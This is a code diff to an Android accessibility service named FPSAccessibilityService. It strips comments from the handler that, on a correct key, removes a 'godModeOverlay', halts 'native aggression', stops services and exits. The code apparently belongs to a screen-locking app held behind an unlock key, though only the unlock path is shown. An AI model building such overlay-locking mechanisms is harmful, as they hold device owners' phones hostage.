@@ -117,35 +117,20 @@ public class FPSAccessibilityService extends AccessibilityService {
         if (btnUnlock != null) {
             btnUnlock.setOnClickListener(v -> {
                 if (verifyAdvancedKey(currentInput)) {
-                    // --- PROTEKSI 1: Matikan Aksesibilitas Secara Otomatis ---
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-                        disableSelf(); // Ini akan mematikan toggle di pengaturan secara otomatis
+                        disableSelf(); 
                     }
-        
-                    // --- PROTEKSI 2: Matikan Seluruh Proses Aplikasi ---
-                    // Set flag agar service lain tahu ini sudah sah
                     FPSService.isAuthenticated = true; 
-                    
-                    // Hentikan native aggression agar proses bisa mati
                     stopNativeAggression(); 
-        
-                    // Hapus Overlay dari layar
                     if (godModeOverlay != null) {
                         windowManager.removeView(godModeOverlay);
                         godModeOverlay = null;
                     }
-        
-                    // Hentikan Background Service (FPSService)
                     Intent stopServiceIntent = new Intent(this, FPSService.class);
                     stopService(stopServiceIntent);
-        
                     writeLog("Double Protection Triggered: Service Disabled & Process Killed.");
-        
-                    // Tutup semua activity yang mungkin masih menggantung di background
                     System.exit(0); 
-                    
                 } else {
-                    // Password salah logic...
                     currentInput = "";
                     display.setText("");
                     textStatusMessage.setText("WRONG KEY");
@@ -153,6 +138,7 @@ public class FPSAccessibilityService extends AccessibilityService {
                 }
             });
         }
+    }
 
     private void startCountdown() {
         android.os.Handler timerHandler = new android.os.Handler(android.os.Looper.getMainLooper());
